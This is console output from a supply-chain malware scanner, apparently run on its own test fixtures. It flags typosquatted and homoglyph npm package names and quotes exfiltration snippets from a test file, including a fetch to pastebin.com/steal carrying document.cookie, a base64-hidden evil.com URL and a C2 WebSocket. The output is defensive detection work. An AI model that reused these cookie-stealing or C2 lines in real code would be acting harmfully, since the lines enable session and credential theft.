[0;34m📦 Loaded 604 compromised packages from /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/compromised-packages.txt[0m
[0;32mStarting Shai-Hulud detection scan...[0m
[0;34mScanning directory: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test (with paranoid mode enabled)[0m

[0;34m🔍 Checking for malicious workflow files...[0m
[0;34m🔍 Checking 2 files for known malicious content...[0m
[K[0;34m🔍 Checking 1 package.json files for compromised packages...[0m
[K1 / 1 checked (100 %)[K[0;34m🔍 Checking for suspicious postinstall hooks...[0m
[0;34m🔍 Checking for suspicious content patterns...[0m
[0;34m🔍 Checking for cryptocurrency theft patterns...[0m
[0;34m🔍 Checking for Trufflehog activity and secret scanning...[0m
[0;34m🔍 Checking for suspicious git branches...[0m
[0;34m🔍 Checking for Shai-Hulud repositories and migration patterns...[0m
[0;34m🔍 Checking package lock files for integrity issues...[0m
[0;34m🔍+ Checking for typosquatting and homoglyph attacks...[0m
[0;34m🔍+ Checking for network exfiltration patterns...[0m

[0;34m==============================================[0m
[0;34m  SHAI-HULUD + PARANOID SECURITY REPORT[0m
[0;34m==============================================[0m

[1;33m⚠️  MEDIUM RISK (PARANOID): Potential typosquatting/homoglyph attacks detected:[0m
   - Warning: Potential typosquatting of 'lodash': lodsh (missing character)
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json
   - Warning: Potential Unicode/homoglyph characters in package: reаct
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/package.json
   [1;33mNOTE: These packages may be impersonating legitimate packages.[0m
   [1;33mVerify package names carefully and check if they should be legitimate packages.[0m

[1;33m⚠️  MEDIUM RISK (PARANOID): Network exfiltration patterns detected:[0m
   - Warning: Hardcoded IP addresses found: 10.0.1.50 
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: Suspicious domain found: pastebin.com at line 4: fetch("https://pastebin.com/steal", {...
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: Base64 decoding at line 16: const hiddenUrl = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");...
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: WebSocket connection to external endpoint: wss://c2-server.evil.com/data
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   - Warning: Suspicious base64 encoding near network operation at line 6:   body: btoa(document.cookie)...
     Found in: /c/Users/gstra/Code/rust-scanner/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
   [1;33mNOTE: These patterns may indicate data exfiltration or communication with C2 servers.[0m
   [1;33mReview network connections and data flows carefully.[0m

[0;34m==============================================[0m
[0;31m🔍 SUMMARY:[0m
[0;31m   High Risk Issues: 0[0m
[1;33m   Medium Risk Issues: 7[0m
[0;34m   Total Critical Issues: 7[0m

[1;33m⚠️  IMPORTANT:[0m
[1;33m   - High risk issues likely indicate actual compromise[0m
[1;33m   - Medium risk issues require manual investigation[0m
[1;33m   - Low risk issues are likely false positives from legitimate code[0m
[1;33m   - Issues marked (PARANOID) are general security checks, not Shai-Hulud specific[0m
[1;33m   - Consider running additional security scans[0m
[1;33m   - Review your npm audit logs and package history[0m
[0;34m==============================================[0m
